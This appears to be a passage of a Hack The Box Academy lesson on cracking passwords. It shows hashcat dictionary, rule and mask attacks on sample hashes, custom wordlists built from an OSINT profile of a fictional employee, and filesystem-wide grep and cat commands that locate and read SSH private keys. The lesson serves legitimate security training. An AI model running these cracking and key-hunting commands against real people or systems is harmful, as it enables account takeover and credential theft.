<p><a href="https://hashcat.net/wiki/doku.php?id=dictionary_attack">Dictionary attack</a> (<code>-a 0</code>) is, as the name suggests, a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as a potential password until the correct one is found or the list is exhausted.</p>
<p>As an example, imagine we extracted the following password hash from an SQL database: <code>e3e3ec5831ad5e7288241960e5d4fdb8</code>. First, we could identify this as an MD5 hash, which has a hash ID of <code>0</code>. To attempt to crack this hash using the <code>rockyou.txt</code> wordlist, the following command would be used:</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">0</span> e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

...SNIP...               

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">0</span> (MD5)
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8
Time.Started.....: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">44</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Time.Estimated...: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">44</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:  <span class="hljs-number">1706.6</span> kH/s (<span class="hljs-number">0.14</span>ms) @ Accel:<span class="hljs-number">512</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (total), <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)
Progress.........: <span class="hljs-number">28672</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.20</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">28672</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">27648</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.19</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: <span class="hljs-number">010292</span> -&gt; spongebob9
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">40</span>%

Started: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">43</span> <span class="hljs-number">2025</span>
Stopped: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">46</span> <span class="hljs-number">2025</span>
</code></pre>
<p>A wordlist alone is often not enough to crack a password hash. As was the case with JtR, <code>rules</code> can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under <code>/usr/share/hashcat/rules</code>:</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -l /usr/share/hashcat/rules

total 2852
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 309439 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>Incisive-leetspeak.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 35802 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>InsidePro-HashManager.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 20580 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>InsidePro-PasswordsPro.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 64068 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 2027 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlC-insert_space_and_special_0_F.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 34437 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlC-insert_top_100_passwords_1_G.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 34813 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlC.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 1289 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlC_3_rule.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 168700 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlC_insert_HTML_entities_0_Z.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 197418 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>T0XlCv2.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 933 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>best64.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 754 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>combinator.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 200739 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>d3ad0ne.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 788063 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>dive.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 78068 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>generated.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 483425 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>generated2.rule
drwxr-xr-x<span class="hljs-number"> 2 </span>root root  <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 19 </span>15:30 hybrid
-rw-r--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 298 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>leetspeak.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 1280 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>oscommerce.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 301161 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>rockyou-30000.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 1563 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>specific.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 45 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>toggles1.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 570 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>toggles2.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 3755 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>toggles3.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 16040 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>toggles4.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 49073 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>toggles5.rule
-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 55346 </span>Apr<span class="hljs-number"> 24 </span><span class="hljs-number"> 2024 </span>unix-ninja-leetspeak.rule
</code></pre>
<p>As another example, imagine an additional md5 hash was leaked from the SQL database: <code>1b0556a75770563578569ae21392630c</code>. We weren&#39;t able to crack it using <code>rockyou.txt</code> alone, so in a subsequent attempt, we might apply some common rule-based transformations. One ruleset we could try is <code>best64.rule</code>, which contains 64 standard password modifications—such as appending numbers or substituting characters with their &quot;leet&quot; equivalents. To perform this kind of attack, we would append the <code>-r &lt;ruleset&gt;</code> option to the command, as shown below:</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">0</span> <span class="hljs-number">1</span>b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">0</span> (MD5)
Hash.Target......: <span class="hljs-number">1</span>b0556a75770563578569ae21392630c
Time.Started.....: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">16</span>:<span class="hljs-number">35</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Time.Estimated...: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">16</span>:<span class="hljs-number">35</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........: <span class="hljs-number">13624.4</span> kH/s (<span class="hljs-number">5.40</span>ms) @ Accel:<span class="hljs-number">512</span> Loops:<span class="hljs-number">77</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (total), <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)
Progress.........: <span class="hljs-number">236544</span>/<span class="hljs-number">1104517645</span> (<span class="hljs-number">0.02</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">236544</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">2048</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.01</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-77</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-77</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: slimshady -&gt; drousd
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">47</span>%

Started: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">16</span>:<span class="hljs-number">35</span> <span class="hljs-number">2025</span>
Stopped: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">16</span>:<span class="hljs-number">37</span> <span class="hljs-number">2025</span>
</code></pre>
<p><strong>Mask attack</strong></p>
<p><a href="https://hashcat.net/wiki/doku.php?id=mask_attack">Mask attack</a> (<code>-a 3</code>) is a type of brute-force attack in which the keyspace is explicitly defined by the user. For example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.</p>
<p>A mask is defined by combining a sequence of symbols, each representing a built-in or custom character set. Hashcat includes several built-in character sets:</p>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>Charset</th>
</tr>
</thead>
<tbody>
<tr>
<td>?l</td>
<td>abcdefghijklmnopqrstuvwxyz</td>
</tr>
<tr>
<td>?u</td>
<td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
</tr>
<tr>
<td>?d</td>
<td>0123456789</td>
</tr>
<tr>
<td>?h</td>
<td>0123456789abcdef</td>
</tr>
<tr>
<td>?H</td>
<td>0123456789ABCDEF</td>
</tr>
<tr>
<td>?s</td>
<td>«space»!&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[]^_`{</td>
</tr>
<tr>
<td>?a</td>
<td>?l?u?d?s</td>
</tr>
<tr>
<td>?b</td>
<td>0x00 - 0xff</td>
</tr>
</tbody>
</table>
<p>Custom charsets can be defined with the <code>-1</code>, <code>-2</code>, <code>-3</code>, and <code>-4</code> arguments, then referred to with <code>?1</code>, <code>?2</code>, <code>?3</code>, and <code>?4</code>.</p>
<p>Let&#39;s say that we specifically want to try passwords which start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol. The resulting hashcat mask would be <code>?u?l?l?l?l?d?s</code>.</p>
<p>&#x20; Introduction to Hashcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -a <span class="hljs-number">3</span> -m <span class="hljs-number">0</span> <span class="hljs-number">1e293</span>d6912d074c0fd15844d803400dd <span class="hljs-string">'?u?l?l?l?l?d?s'</span>

...SNIP...

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">0</span> (MD5)
Hash.Target......: <span class="hljs-number">1e293</span>d6912d074c0fd15844d803400dd
Time.Started.....: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">43</span>:<span class="hljs-number">02</span> <span class="hljs-number">2025</span> (<span class="hljs-number">4</span> secs)
Time.Estimated...: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">43</span>:<span class="hljs-number">06</span> <span class="hljs-number">2025</span> (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?u?l?l?l?l?d?s [<span class="hljs-number">7</span>]
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:   <span class="hljs-number">101.6</span> MH/s (<span class="hljs-number">9.29</span>ms) @ Accel:<span class="hljs-number">512</span> Loops:<span class="hljs-number">1024</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (total), <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests (new)
Progress.........: <span class="hljs-number">456237056</span>/<span class="hljs-number">3920854080</span> (<span class="hljs-number">11.64</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">456237056</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">25600</span>/<span class="hljs-number">223080</span> (<span class="hljs-number">11.48</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">5120</span><span class="hljs-number">-6144</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1024</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: Uayvf7- -&gt; Dikqn5!
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">98</span>%

Started: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">42</span>:<span class="hljs-number">46</span> <span class="hljs-number">2025</span>
Stopped: Sat Apr <span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">43</span>:<span class="hljs-number">08</span> <span class="hljs-number">2025</span>
</code></pre>
<hr>
<h2 id="writing-custom-wordlists-and-rules">Writing Custom Wordlists and Rules</h2>
<p>Many users create their passwords based on <code>simplicity rather than security</code>. To mitigate this human tendency (which often undermines security measures), password policies can be implemented on systems to enforce specific password requirements. For instance, a system might enforce the inclusion of uppercase letters, special characters, and numbers. Most password policies mandate a minimum length—typically eight characters—and require at least one character from each specified category.</p>
<p>In the previous sections, we were successful at guessing simple passwords. However, it becomes significantly more challenging to apply these techniques to systems that require users to create more complex passwords.</p>
<p>Unfortunately, the tendency for users to create weak passwords occurs even when password policies are in place. Most individuals follow predictable patterns when creating passwords, often incorporating words closely related to the service being accessed. For example, many employees choose passwords that include the company&#39;s name. Personal preferences and interests also play a significant role—these may include references to pets, friends, sports, hobbies, and other aspects of daily life. Basic OSINT (Open Source Intelligence) techniques can be highly effective in uncovering such personal information and may assist in password guessing. More information about OSINT can be found in the <a href="https://academy.hackthebox.com/course/preview/osint-corporate-recon">OSINT: Corporate Recon module</a>.</p>
<p>Commonly, users use the following additions for their password to fit the most common password policies:</p>
<table>
<thead>
<tr>
<th><strong>Description</strong></th>
<th><strong>Password Syntax</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>First letter is uppercase</td>
<td><code>Password</code></td>
</tr>
<tr>
<td>Adding numbers</td>
<td><code>Password123</code></td>
</tr>
<tr>
<td>Adding year</td>
<td><code>Password2022</code></td>
</tr>
<tr>
<td>Adding month</td>
<td><code>Password02</code></td>
</tr>
<tr>
<td>Last character is an exclamation mark</td>
<td><code>Password2022!</code></td>
</tr>
<tr>
<td>Adding special characters</td>
<td><code>P@ssw0rd2022!</code></td>
</tr>
</tbody>
</table>
<p>Knowing that users tend to keep their passwords as simple as possible, we can create rules to generate likely weak passwords. According to statistics provided by <a href="https://wpengine.com/resources/passwords-unmasked-infographic/">WP Engine</a>, most passwords are no longer than <code>ten</code> characters. One approach is to select familiar terms that are at least five characters long—such as pet names, hobbies, personal preferences, or other common interests. For instance, if a user selects a single word (e.g., the current month), appends the current year, and adds a special character at the end, the result may satisfy a typical ten-character password requirement. Considering that most organizations require regular password changes, a use might modify their password by simply changing the name of the month or incrementing a single digit.</p>
<p>Let&#39;s look at a simple example using a password list with only one entry.</p>
<p>&#x20; Writing Custom Wordlists and Rules</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ cat password.list

password
</code></pre>
<p>We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. Hashcat uses a specific syntax to define characters, words, and their transformations. The complete syntax is documented in the official <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Hashcat rule-based attack documentation</a>, but the examples below are sufficient to understand how Hashcat mutates input words.</p>
<table>
<thead>
<tr>
<th><strong>Function</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>:</code></td>
<td>Do nothing</td>
</tr>
<tr>
<td><code>l</code></td>
<td>Lowercase all letters</td>
</tr>
<tr>
<td><code>u</code></td>
<td>Uppercase all letters</td>
</tr>
<tr>
<td><code>c</code></td>
<td>Capitalize the first letter and lowercase others</td>
</tr>
<tr>
<td><code>sXY</code></td>
<td>Replace all instances of X with Y</td>
</tr>
<tr>
<td><code>$!</code></td>
<td>Add the exclamation character at the end</td>
</tr>
</tbody>
</table>
<p>Each rule is written on a new line and determines how a given word should be transformed. If we write the functions shown above into a file, it may look like this:</p>
<p>&#x20; Writing Custom Wordlists and Rules</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-symbol">$</span> cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
<span class="hljs-symbol">$</span>!
<span class="hljs-symbol">$</span>! c
<span class="hljs-symbol">$</span>! so0
<span class="hljs-symbol">$</span>! sa@
<span class="hljs-symbol">$</span>! c so0
<span class="hljs-symbol">$</span>! c sa@
<span class="hljs-symbol">$</span>! so0 sa@
<span class="hljs-symbol">$</span>! c so0 sa@
</code></pre>
<p>We can use the following command to apply the rules in <code>custom.rule</code> to each word in <code>password.list</code> and store the mutated results in <code>mut_password.list</code>.</p>
<p>&#x20; Writing Custom Wordlists and Rules</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat --force password.<span class="hljs-built_in">list</span> -r custom.rule --<span class="hljs-built_in">stdout</span> | sort -u &gt; mut_password.<span class="hljs-built_in">list</span>
</code></pre>
<p>In this case, the single input word will produce fifteen mutated variants.</p>
<p>&#x20; Writing Custom Wordlists and Rules</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ cat mut_password.<span class="hljs-keyword">list</span>

password
Password
passw0rd
Passw0rd
p<span class="hljs-meta">@ssword</span>
P<span class="hljs-meta">@ssword</span>
P<span class="hljs-meta">@ssw</span>0rd
password!
Password!
passw0rd!
p<span class="hljs-meta">@ssword</span>!
Passw0rd!
P<span class="hljs-meta">@ssword</span>!
p<span class="hljs-meta">@ssw</span>0rd!
P<span class="hljs-meta">@ssw</span>0rd!
</code></pre>
<p>Hashcat and JtR both come with pre-built rule lists that can be used for password generation and cracking. One of the most effective and widely used rulesets is <code>best64.rule</code>, which applies common transformations that frequently result in successful password guesses. It is important to note that password cracking and the creation of custom wordlists are, in most cases, a guessing game. We can narrow this down and perform more targeted guessing if we have information about the password policy, while considering factors such as the company name, geographical region, industry, and other topics or keywords that users might choose when creating their passwords. Exceptions, of course, include cases where passwords have been leaked and directly obtained.</p>
<h3 id="generating-wordlists-using-cewl">Generating wordlists using CeWL</h3>
<p>We can use a tool called <a href="https://github.com/digininja/CeWL">CeWL</a> to scan potential words from a company&#39;s website and save them in a separate list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee. We specify some parameters, like the depth to spider (<code>-d</code>), the minimum length of the word (<code>-m</code>), the storage of the found words in lowercase (<code>--lowercase</code>), as well as the file where we want to store the results (<code>-w</code>).</p>
<p>&#x20; Writing Custom Wordlists and Rules</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ cewl https:/</span>/www.inlanefreight.com -d <span class="hljs-number">4</span> -m <span class="hljs-number">6</span> --lowercase -w inlane.wordlist
root@htb[/htb]$ wc -l inlane.wordlist

<span class="hljs-number">326</span>
</code></pre>
<h3 id="exercise">Exercise</h3>
<p>For this sections exercise, imagine that we compromised the password hash of a <code>work email</code> belonging to <code>Mark White</code>. After performing a bit of OSINT, we have gathered the following information about Mark:</p>
<ul>
<li>He was born on <code>August 5, 1998</code></li>
<li>He works at <code>Nexura, Ltd.</code><ul>
<li>The company&#39;s password policy requires passwords to be at least 12 characters long, to contain at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number</li>
</ul>
</li>
<li>He lives in <code>San Francisco, CA, USA</code></li>
<li>He has a pet cat named <code>Bella</code></li>
<li>He has a wife named <code>Maria</code></li>
<li>He has a son named <code>Alex</code></li>
<li>He is a big fan of <code>baseball</code></li>
</ul>
<p>The password hash is: <code>97268a8ae45ac7d15c3cea4ce6ea550b</code>. Use the techniques covered in this section to generate a custom wordlist and ruleset targeting Mark specifically, and crack the password.</p>
<hr>
<h2 id="cracking-protected-files">Cracking Protected Files</h2>
<p>The use of file encryption is often neglected in both <code>private</code> and <code>professional</code> contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the <a href="https://gdpr-info.eu/">General Data Protection Regulation (GDPR)</a> requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss <code>confidential</code> topics or transmit <code>sensitive</code> data via email, which may be intercepted by attackers positioned to exploit these communication channels.</p>
<p>As more companies enhance their IT security infrastructure through training programs and security awareness seminars, it is becoming increasingly common for employees to encrypt sensitive files. Nevertheless, encrypted files can still be cracked and accessed with the right combination of wordlists and tools. In many cases, <code>symmetric encryption</code> algorithms such as <code>AES-256</code> are used to securely store individual files or folders. In this method, the same key is used for both encryption and decryption. For transmitting files, <code>asymmetric encryption</code> is typically employed, which uses two distinct keys: the sender encrypts the file with the recipient&#39;s <code>public key</code>, and the recipient decrypts it using the corresponding <code>private ke</code>y.</p>
<p>Up until now, we&#39;ve focused on cracking password hashes specifically. In the next two sections, we will shift our focus to techniques related to attacking password-protected files and archives.</p>
<h3 id="hunting-for-encrypted-files">Hunting for Encrypted Files</h3>
<p>Many different extensions correspond to encrypted files—a useful reference list can be found on <a href="https://fileinfo.com/filetypes/encoded">FileInfo</a>. As an example, consider this command we might use to locate commonly encrypted files on a Linux system:</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find /</span> -name *$ext <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">"lib\|fonts\|share\|core"</span> ;done

<span class="hljs-keyword">File</span> extension:  .xls

<span class="hljs-keyword">File</span> extension:  .xls*

<span class="hljs-keyword">File</span> extension:  .xltx

<span class="hljs-keyword">File</span> extension:  .od*
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/Docs/</span>document-temp.odt
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/Docs/</span>product-improvements.odp
<span class="hljs-regexp">/home/</span>cry0l1t3<span class="hljs-regexp">/Docs/mgm</span>t-spreadsheet.ods
...SNIP...
</code></pre>
<p>If we encounter file extensions on a system that we are unfamiliar with, we can use search engines to research the technology behind them. There are, after all, hundreds of different file extensions, and no one is expected to know all of them by heart.</p>
<h3 id="hunting-for-ssh-keys">Hunting for SSH keys</h3>
<p>Certain files, such as SSH keys, do not have standard file extension. In cases like these, it may be possible to identify files by standard content such as header and footer values. For example, SSH private keys always begin with <code>-----BEGIN [...SNIP...] PRIVATE KEY-----</code>. We can use tools like <code>grep</code> to recursively search the file system for them during post-exploitation.</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /</span>* <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span>

/home/jsmith/.ssh/<span class="hljs-symbol">id_ed25519:</span><span class="hljs-number">1</span><span class="hljs-symbol">:-----BEGIN</span> OPENSSH PRIVATE KEY-----
<span class="hljs-regexp">/home/jsmith</span><span class="hljs-regexp">/.ssh/</span>SSH.<span class="hljs-symbol">private:</span><span class="hljs-number">1</span><span class="hljs-symbol">:-----BEGIN</span> RSA PRIVATE KEY-----
<span class="hljs-regexp">/home/jsmith</span><span class="hljs-regexp">/Documents/id</span><span class="hljs-symbol">_rsa:</span><span class="hljs-number">1</span><span class="hljs-symbol">:-----BEGIN</span> OPENSSH PRIVATE KEY-----
&lt;SNIP&gt;
</code></pre>
<p>Some SSH keys are encrypted with a passphrase. With older PEM formats, it was possible to tell if an SSH key is encrypted based on the header, which contains the encryption method in use. Modern SSH keys, however, appear the same whether encrypted or not.</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>home<span class="hljs-regexp">/jsmith/</span>.ssh/SSH.<span class="hljs-keyword">private</span>

-----BEGIN RSA PRIVATE KEY-----
Proc-<span class="hljs-string">Type:</span> <span class="hljs-number">4</span>,ENCRYPTED
DEK-<span class="hljs-string">Info:</span> AES<span class="hljs-number">-128</span>-CBC,<span class="hljs-number">2109</span>D25CC91F8DBFCEB0F7589066B2CC

<span class="hljs-number">8</span>Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
<span class="hljs-number">4</span><span class="hljs-regexp">/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/</span><span class="hljs-number">9</span>UqZmmHktjD3+OYTsD
&lt;SNIP&gt;
</code></pre>
<p>One way to tell whether an SSH key is encrypted or not, is to try reading the key with <code>ssh-keygen</code>.</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ ssh-keygen -yf ~/</span>.ssh/id_ed25519 

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+<span class="hljs-number">22</span>Zh59Gzmmtzo6rAffCx2UtaS6
</code></pre>
<p>As shown below, attempting to read a password-protected SSH key will prompt the user for a passphrase:</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ ssh-keygen -yf ~/</span>.ssh/id_rsa

Enter passphrase <span class="hljs-keyword">for</span> <span class="hljs-string">"/home/jsmith/.ssh/id_rsa"</span>:
</code></pre>
<h3 id="cracking-encrypted-ssh-keys">Cracking encrypted SSH keys</h3>
<p>As mentioned in a previous section, JtR has many different scripts for extracting hashes from files—which we can then proceed to crack. We can find these scripts on our system using the following command:</p>
<p>&#x20; Cracking Protected Files</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ locate *<span class="hljs-number">2</span>john*

<span class="hljs-meta-keyword">/usr/</span>bin/bitlocker2john
<span class="hljs-meta-keyword">/usr/</span>bin/dmg2john
<span class="hljs-meta-keyword">/usr/</span>bin/gpg2john
